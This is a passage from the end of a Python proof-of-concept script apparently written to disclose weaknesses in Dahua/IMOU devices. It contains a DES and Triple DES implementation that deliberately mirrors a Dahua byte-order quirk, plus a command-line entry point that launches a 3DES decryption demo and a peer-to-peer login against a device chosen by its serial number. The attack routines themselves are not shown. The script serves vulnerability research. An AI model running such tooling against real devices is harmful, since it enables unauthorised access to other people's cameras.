		40, 51, 30, 36, 46, 54,
		29, 39, 50, 44, 32, 47,
		43, 48, 38, 55, 33, 52,
		45, 41, 49, 35, 28, 31
	]

	# initial permutation IP
	__ip = [
		57, 49, 41, 33, 25, 17, 9,  1,
		59, 51, 43, 35, 27, 19, 11, 3,
		61, 53, 45, 37, 29, 21, 13, 5,
		63, 55, 47, 39, 31, 23, 15, 7,
		56, 48, 40, 32, 24, 16, 8,  0,
		58, 50, 42, 34, 26, 18, 10, 2,
		60, 52, 44, 36, 28, 20, 12, 4,
		62, 54, 46, 38, 30, 22, 14, 6
	]

	# Expansion table for turning 32 bit blocks into 48 bits
	__expansion_table = [
		31,  0,  1,  2,  3,  4,
		3,  4,  5,  6,  7,  8,
		7,  8,  9, 10, 11, 12,
		11, 12, 13, 14, 15, 16,
		15, 16, 17, 18, 19, 20,
		19, 20, 21, 22, 23, 24,
		23, 24, 25, 26, 27, 28,
		27, 28, 29, 30, 31,  0
	]

	# The (in)famous S-boxes
	__sbox = [
		# S1
		[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
		0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
		4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
		15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],

		# S2
		[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
		3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
		0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
		13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],

		# S3
		[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
		13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
		13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
		1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],

		# S4
		[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
		13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
		10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
		3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],

		# S5
		[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
		14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
		4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
		11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],

		# S6
		[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
		10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
		9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
		4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],

		# S7
		[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
		13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
		1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
		6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],

		# S8
		[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
		1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
		7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
		2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],
	]


	# 32-bit permutation function P used on the output of the S-boxes
	__p = [
		15, 6, 19, 20, 28, 11,
		27, 16, 0, 14, 22, 25,
		4, 17, 30, 9, 1, 7,
		23,13, 31, 26, 2, 8,
		18, 12, 29, 5, 21, 10,
		3, 24
	]

	# final permutation IP^-1
	__fp = [
		39,  7, 47, 15, 55, 23, 63, 31,
		38,  6, 46, 14, 54, 22, 62, 30,
		37,  5, 45, 13, 53, 21, 61, 29,
		36,  4, 44, 12, 52, 20, 60, 28,
		35,  3, 43, 11, 51, 19, 59, 27,
		34,  2, 42, 10, 50, 18, 58, 26,
		33,  1, 41,  9, 49, 17, 57, 25,
		32,  0, 40,  8, 48, 16, 56, 24
	]

	# Initialisation
	def __init__(self, key):
		_baseDes.__init__(self)
		self.key_size = 8
		self.L = []
		self.R = []
		self.Kn = [ [0] * 48 ] * 16 # 16 48-bit keys (K1 - K16)
		self.final = []

		self.setKey(key)

	def setKey(self, key):
		"""Will set the crypting key for this object. Must be 8 bytes."""
		_baseDes.setKey(self, key)
		self.__create_sub_keys()

	def __String_to_BitList(self, data):
		"""Turn the string data, into a list of bits (1, 0)'s"""
		return bits(data,endian='little') # Dahua endianness bug

	def __BitList_to_String(self, data):
		"""Turn the list of bits -> data, into a string"""
		return bytes(list(unbits(data,endian='little'))) # Dahua endianness bug

	def __permutate(self, table, block):
		"""Permutate this block with the specified table"""
		return list(map(lambda x: block[x], table))
	
	# Transform the secret key, so that it is ready for data processing
	# Create the 16 subkeys, K[1] - K[16]
	def __create_sub_keys(self):
		"""Create the 16 subkeys K[1] to K[16] from the given key"""
		key = self.__permutate(des.__pc1, self.__String_to_BitList(self.getKey()))
		i = 0
		# Split into Left and Right sections
		self.L = key[:28]
		self.R = key[28:]

		while i < 16:
			j = 0
			# Perform circular left shifts
			while j < des.__left_rotations[i]:
				self.L.append(self.L[0])
				del self.L[0]

				self.R.append(self.R[0])
				del self.R[0]
				j += 1
			# Create one of the 16 subkeys through pc2 permutation
			self.Kn[i] = self.__permutate(des.__pc2, self.L + self.R)
			i += 1

	# Main part of the encryption algorithm, the number cruncher :)
	def __des_crypt(self, block, crypt_type):
		"""Crypt the block of data through DES bit-manipulation"""
		block = self.__permutate(des.__ip, block)

		self.L = block[:32]
		self.R = block[32:]

		# Encryption starts from Kn[1] through to Kn[16]
		if crypt_type == ENCRYPT:
			iteration = 0
			iteration_adjustment = 1
		# Decryption starts from Kn[16] down to Kn[1]
		else:
			iteration = 15
			iteration_adjustment = -1

		i = 0
		while i < 16:
			# Make a copy of R[i-1], this will later become L[i]
			if crypt_type == ENCRYPT:
				tempR = self.R[:]
			else:
				tempR = self.L[:]

			# Permutate R[i - 1] to start creating R[i]
			if crypt_type == ENCRYPT:
				self.R = self.__permutate(des.__expansion_table, self.R)
			else:
				self.L = self.__permutate(des.__expansion_table, self.L)

			# Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here
			if crypt_type == ENCRYPT:
				self.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))
				B = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]
			else:
				self.L = list(map(lambda x, y: x ^ y, self.L, self.Kn[iteration]))
				B = [self.L[:6], self.L[6:12], self.L[12:18], self.L[18:24], self.L[24:30], self.L[30:36], self.L[36:42], self.L[42:]]

			# Permutate B[1] to B[8] using the S-Boxes
			j = 0
			Bn = []
			while j < 8:

				# Work out the offsets
				m = (B[j][0] << 1) + B[j][5]
				n = (B[j][1] << 3) + (B[j][2] << 2) + (B[j][3] << 1) + B[j][4]

				# Find the permutation value
				v = des.__sbox[j][(m << 4) + n]

				# Turn value into bits, add it to result: Bn
				for tmp in list(map(lambda x: x, bits(v,endian='little')[:4])): # Dahua endianness bug
					Bn.append(tmp)

				j += 1

			# Permutate the concatination of B[1] to B[8] (Bn)
			if crypt_type == ENCRYPT:
				self.R = self.__permutate(des.__p, Bn)
			else:
				self.L = self.__permutate(des.__p, Bn)

			# Xor with L[i - 1]
			if crypt_type == ENCRYPT:
				self.R = list(map(lambda x, y: x ^ y, self.R, self.L))
			else:
				self.L = list(map(lambda x, y: x ^ y, self.R, self.L))

			# L[i] becomes R[i - 1]
			if crypt_type == ENCRYPT:
				self.L = tempR
			else:
				self.R = tempR

			i += 1
			iteration += iteration_adjustment

		# Final permutation of R[16]L[16]
		if crypt_type == ENCRYPT:
			self.final = self.__permutate(des.__fp, self.L + self.R)
		else:
			self.final = self.__permutate(des.__fp, self.L + self.R)
		return self.final


	# Data to be encrypted/decrypted
	def crypt(self, data, crypt_type):
		"""Crypt the data in blocks, running it through des_crypt()"""

		# Error check the data
		if not data:
			return ''

		# Split the data into blocks, crypting each one seperately
		i = 0
		dict = {}
		result = []

		while i < len(data):

			block = self.__String_to_BitList(data[i:i+8])
			processed_block = self.__des_crypt(block, crypt_type)

			# Add the resulting crypted block to our list
			result.append(self.__BitList_to_String(processed_block))
			i += 8

		# Return the full crypted string
		return bytes.fromhex('').join(result)

	def encrypt(self, data):

		return self.crypt(data, ENCRYPT)

	def decrypt(self, data):

		return self.crypt(data, DECRYPT)



#############################################################################
#     Triple DES        #
#############################################################################
class triple_des(_baseDes):

	def __init__(self, key):
		_baseDes.__init__(self)

		self.setKey(key)

	def setKey(self, key):
		"""Will set the crypting key for this object. Either 16 or 24 bytes long."""
		self.key_size = 24  # Use DES-EDE3 mode
		if len(key) != self.key_size:
			if len(key) == 16: # Use DES-EDE2 mode
				self.key_size = 16

		self.__key1 = des(key[:8])
		self.__key2 = des(key[8:16])
		if self.key_size == 16:
			self.__key3 = self.__key1
		else:
			self.__key3 = des(key[16:])

		_baseDes.setKey(self, key)

	def encrypt(self, data):

		data = self.__key1.crypt(data, ENCRYPT)
		data = self.__key2.crypt(data, DECRYPT)
		data = self.__key3.crypt(data, ENCRYPT)
		return data

	def decrypt(self, data):
		data = self.__key3.crypt(data, DECRYPT)
		data = self.__key2.crypt(data, ENCRYPT)
		data = self.__key1.crypt(data, DECRYPT)
		return data
#
# --------- [END] ---------
#



if __name__ == '__main__':

#
# Help, info and pre-defined values
#	
	INFO =  '[Dahua 3DES/IMOU PoC 2020 bashis <mcw noemail eu>]\n'

#
# Try to parse all arguments
# 
	try:
		arg_parser = argparse.ArgumentParser(
		prog=sys.argv[0],
				description=('[*] '+ INFO +' [*]'))
		arg_parser.add_argument('--poc_3des', required=False, default=False, action='store_true', help='Dahua 3DES decryption PoC')
		arg_parser.add_argument('--dhp2p', required=False, type=str, default=None, help='[dhp2p_poc] Device serial number we shall connect to')
		arg_parser.add_argument('--probe', required=False, default=False, action='store_true', help='[dhp2p_poc] Probe the device only')
		arg_parser.add_argument('-d','--debug', required=False, default=0, const=0x1, dest="debug", action='store_const', help='Debug (normal)')
		arg_parser.add_argument('-dd','--ddebug', required=False, default=0, const=0x2, dest="ddebug", action='store_const', help='Debug (hexdump)')
		args = arg_parser.parse_args()
	except Exception as e:
		print(INFO,"\nError: {}\n".format(str(e)))
		sys.exit(False)

	# We want at least one argument, so print out help
	if len(sys.argv) == 1:
		arg_parser.parse_args(['-h'])

	log.info(INFO)
	status = True

	debug = args.debug + args.ddebug

	if args.poc_3des:
		status = PoC_3des()
	elif args.probe and not args.dhp2p:
		log.failure("You need to set '--dhp2p'")
		status = False
	elif args.dhp2p:
		status = Dahua_DHP2P_Login()

	log.info("All done")
	sys.exit(status)

